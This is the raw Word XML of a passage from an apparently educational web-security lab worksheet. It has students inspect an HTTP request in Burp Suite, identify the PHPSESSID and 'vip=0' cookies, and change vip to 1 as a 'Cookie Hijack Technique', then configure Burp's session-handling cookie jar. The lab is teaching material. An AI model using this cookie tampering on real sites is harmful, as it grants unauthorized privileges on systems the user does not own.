      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D7D7739" w14:textId="77777777" w:rsidR="004275B4" w:rsidRPr="00FA4E5F" w:rsidRDefault="001C35C4" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="644"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:pict w14:anchorId="6B663EFC">
          <v:shape id="_x0000_i1030" type="#_x0000_t75" style="width:415.75pt;height:223.9pt;visibility:visible">
            <v:imagedata r:id="rId14" o:title=""/>
          </v:shape>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="4153985A" w14:textId="77777777" w:rsidR="004275B4" w:rsidRPr="00FA4E5F" w:rsidRDefault="004275B4" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="644"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Observe Cookie and also login data</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F089BF2" w14:textId="77777777" w:rsidR="00E75062" w:rsidRPr="00FA4E5F" w:rsidRDefault="00E75062" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="644"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4853784B" w14:textId="77777777" w:rsidR="005023F8" w:rsidRPr="00FA4E5F" w:rsidRDefault="005023F8" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="385623"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>In the RAW view you can see the HTTP Request packet.</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="385623"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>What are the</w:t>
      </w:r>
      <w:r w:rsidR="00FF5635" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="385623"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> two COOKIE parameters</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="385623"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="453AA5DE" w14:textId="77777777" w:rsidR="00B00123" w:rsidRPr="00FA4E5F" w:rsidRDefault="00000000" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="385623"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
        <w:pict w14:anchorId="15AEDCC1">
          <v:rect id="_x0000_s2091" style="position:absolute;left:0;text-align:left;margin-left:15pt;margin-top:6.8pt;width:318.75pt;height:208.55pt;z-index:1">
            <v:textbox style="mso-next-textbox:#_x0000_s2091">
              <w:txbxContent>
                <w:p w14:paraId="77C4066A" w14:textId="77777777" w:rsidR="00FF5635" w:rsidRPr="00CA4DA6" w:rsidRDefault="00FF5635">
                  <w:pPr>
                    <w:rPr>
                      <w:rFonts w:ascii="Comic Sans MS" w:hAnsi="Comic Sans MS"/>
                      <w:i/>
                      <w:color w:val="FF0000"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r w:rsidRPr="00CA4DA6">
                    <w:rPr>
                      <w:rFonts w:ascii="Comic Sans MS" w:hAnsi="Comic Sans MS"/>
                      <w:i/>
                      <w:color w:val="FF0000"/>
                    </w:rPr>
                    <w:t>SessionID</w:t>
                  </w:r>
                  <w:r w:rsidR="00B611E4" w:rsidRPr="00CA4DA6">
                    <w:rPr>
                      <w:rFonts w:ascii="Comic Sans MS" w:hAnsi="Comic Sans MS"/>
                      <w:i/>
                      <w:color w:val="FF0000"/>
                    </w:rPr>
                    <w:t xml:space="preserve"> </w:t>
                  </w:r>
                  <w:r w:rsidR="00E62FFF">
                    <w:rPr>
                      <w:rFonts w:ascii="Comic Sans MS" w:hAnsi="Comic Sans MS"/>
                      <w:i/>
                      <w:color w:val="FF0000"/>
                    </w:rPr>
                    <w:t xml:space="preserve">(PHPSESSID) </w:t>
                  </w:r>
                  <w:r w:rsidR="00B611E4" w:rsidRPr="00CA4DA6">
                    <w:rPr>
                      <w:rFonts w:ascii="Comic Sans MS" w:hAnsi="Comic Sans MS"/>
                      <w:i/>
                      <w:color w:val="FF0000"/>
                    </w:rPr>
                    <w:t>= big string</w:t>
                  </w:r>
                </w:p>
                <w:p w14:paraId="3636F7C3" w14:textId="77777777" w:rsidR="00FF5635" w:rsidRDefault="00170C79">
                  <w:pPr>
                    <w:rPr>
                      <w:rFonts w:ascii="Comic Sans MS" w:hAnsi="Comic Sans MS"/>
                      <w:color w:val="FF0000"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r w:rsidRPr="00CA4DA6">
                    <w:rPr>
                      <w:rFonts w:ascii="Comic Sans MS" w:hAnsi="Comic Sans MS"/>
                      <w:i/>
                      <w:color w:val="FF0000"/>
                    </w:rPr>
                    <w:t>vip</w:t>
                  </w:r>
                  <w:r w:rsidR="00B611E4" w:rsidRPr="00CA4DA6">
                    <w:rPr>
                      <w:rFonts w:ascii="Comic Sans MS" w:hAnsi="Comic Sans MS"/>
                      <w:i/>
                      <w:color w:val="FF0000"/>
                    </w:rPr>
                    <w:t xml:space="preserve"> = 0</w:t>
                  </w:r>
                </w:p>
                <w:p w14:paraId="75CBB300" w14:textId="77777777" w:rsidR="002D6CF1" w:rsidRPr="002D6CF1" w:rsidRDefault="00000000">
                  <w:pPr>
                    <w:rPr>
                      <w:rFonts w:ascii="Comic Sans MS" w:hAnsi="Comic Sans MS"/>
                      <w:color w:val="FF0000"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:rPr>
                      <w:rFonts w:ascii="Comic Sans MS" w:hAnsi="Comic Sans MS"/>
                      <w:color w:val="FF0000"/>
                    </w:rPr>
                    <w:pict w14:anchorId="4823BC40">
                      <v:shape id="_x0000_i1032" type="#_x0000_t75" style="width:243.45pt;height:135.25pt">
                        <v:imagedata r:id="rId15" o:title=""/>
                      </v:shape>
                    </w:pict>
                  </w:r>
                </w:p>
              </w:txbxContent>
            </v:textbox>
            <w10:wrap type="square"/>
          </v:rect>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="75FA2091" w14:textId="77777777" w:rsidR="00B00123" w:rsidRPr="00FA4E5F" w:rsidRDefault="00B00123" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="385623"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="17C06299" w14:textId="77777777" w:rsidR="00B00123" w:rsidRPr="00FA4E5F" w:rsidRDefault="00B00123" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="385623"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A934E3D" w14:textId="77777777" w:rsidR="002D6CF1" w:rsidRPr="00FA4E5F" w:rsidRDefault="002D6CF1" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="385623"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="102D5F04" w14:textId="77777777" w:rsidR="002D6CF1" w:rsidRPr="00FA4E5F" w:rsidRDefault="002D6CF1" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="385623"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="37A2E2A9" w14:textId="77777777" w:rsidR="002D6CF1" w:rsidRPr="00FA4E5F" w:rsidRDefault="002D6CF1" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="385623"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7EDE4ECC" w14:textId="77777777" w:rsidR="002D6CF1" w:rsidRPr="00FA4E5F" w:rsidRDefault="002D6CF1" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="385623"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3181ED68" w14:textId="77777777" w:rsidR="002D6CF1" w:rsidRPr="00FA4E5F" w:rsidRDefault="002D6CF1" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="385623"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="607D8E03" w14:textId="77777777" w:rsidR="002D6CF1" w:rsidRPr="00FA4E5F" w:rsidRDefault="002D6CF1" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="385623"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4BBE041F" w14:textId="77777777" w:rsidR="002D6CF1" w:rsidRPr="00FA4E5F" w:rsidRDefault="002D6CF1" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="385623"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="53B0FCD7" w14:textId="77777777" w:rsidR="00FF5635" w:rsidRPr="00FA4E5F" w:rsidRDefault="00170C79" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Let's t</w:t>
      </w:r>
      <w:r w:rsidR="00FF5635" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>ry setting the VIP parameter to 1</w:t>
      </w:r>
      <w:r w:rsidR="002D6CF1" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="002D6CF1" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>(Cookie Hijack</w:t>
      </w:r>
      <w:r w:rsidR="00E62FFF" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> Technique</w:t>
      </w:r>
      <w:r w:rsidR="002D6CF1" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidR="00FF5635" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47E0AD4E" w14:textId="77777777" w:rsidR="004275B4" w:rsidRPr="00FA4E5F" w:rsidRDefault="00E75062" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>On BurpS</w:t>
      </w:r>
      <w:r w:rsidR="00E62FFF" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">uite, </w:t>
      </w:r>
      <w:r w:rsidR="00B611E4" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r w:rsidR="00FF5635" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">lick </w:t>
      </w:r>
      <w:r w:rsidR="004275B4" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">Project </w:t>
      </w:r>
      <w:r w:rsidR="00B611E4" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Options</w:t>
      </w:r>
      <w:r w:rsidR="00FF5635" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00B611E4" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidR="00FF5635" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>tab</w:t>
      </w:r>
      <w:r w:rsidR="00B611E4" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>) &gt; Sessions</w:t>
      </w:r>
      <w:r w:rsidR="004275B4" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> (tab) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11656414" w14:textId="77777777" w:rsidR="00F42634" w:rsidRPr="00FA4E5F" w:rsidRDefault="00F42634" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="79BD0577" w14:textId="77777777" w:rsidR="00F42634" w:rsidRPr="00FA4E5F" w:rsidRDefault="001C35C4" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:pict w14:anchorId="4C8B3691">
          <v:shape id="_x0000_i1033" type="#_x0000_t75" style="width:414.5pt;height:89.9pt">
            <v:imagedata r:id="rId16" o:title=""/>
          </v:shape>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="63879AE4" w14:textId="77777777" w:rsidR="00B611E4" w:rsidRPr="00FA4E5F" w:rsidRDefault="004275B4" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">On </w:t>
      </w:r>
      <w:r w:rsidR="00B611E4" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">Session </w:t>
      </w:r>
      <w:r w:rsidR="00B00123" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>H</w:t>
      </w:r>
      <w:r w:rsidR="00B611E4" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>andlin</w:t>
      </w:r>
      <w:r w:rsidR="00B00123" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>g</w:t>
      </w:r>
      <w:r w:rsidR="00B611E4" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> Rules </w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">section </w:t>
      </w:r>
      <w:r w:rsidR="00170C79" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Select</w:t>
      </w:r>
      <w:r w:rsidR="00B611E4" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> Use cookies from Burp's cookie jar</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="644E15FC" w14:textId="77777777" w:rsidR="00B611E4" w:rsidRPr="00FA4E5F" w:rsidRDefault="004275B4" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">Click </w:t>
      </w:r>
      <w:r w:rsidR="00B611E4" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">Edit. A dialog box appears. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22AE59BD" w14:textId="77777777" w:rsidR="00CA4DA6" w:rsidRPr="00FA4E5F" w:rsidRDefault="00CA4DA6" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>In the Details tab, make sure Use cookies from the Session handling Cookie Jar is selected.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15B55E70" w14:textId="77777777" w:rsidR="004275B4" w:rsidRPr="00FA4E5F" w:rsidRDefault="001C35C4" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1004"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:pict w14:anchorId="13B93D9B">
          <v:shape id="_x0000_i1034" type="#_x0000_t75" style="width:415.75pt;height:233.9pt;visibility:visible">
            <v:imagedata r:id="rId17" o:title=""/>
          </v:shape>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="69F499B2" w14:textId="77777777" w:rsidR="004275B4" w:rsidRPr="00FA4E5F" w:rsidRDefault="004275B4" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1004"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="67B9258B" w14:textId="77777777" w:rsidR="00170C79" w:rsidRPr="00FA4E5F" w:rsidRDefault="00170C79" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Change to the Scope tab.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44E22435" w14:textId="77777777" w:rsidR="00B611E4" w:rsidRPr="00FA4E5F" w:rsidRDefault="00CA4DA6" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Select</w:t>
      </w:r>
      <w:r w:rsidR="00B611E4" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> Proxy (use with caution)</w:t>
      </w:r>
      <w:r w:rsidR="00B00123" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">  (leave Spider, Scanner selected)</w:t>
      </w:r>
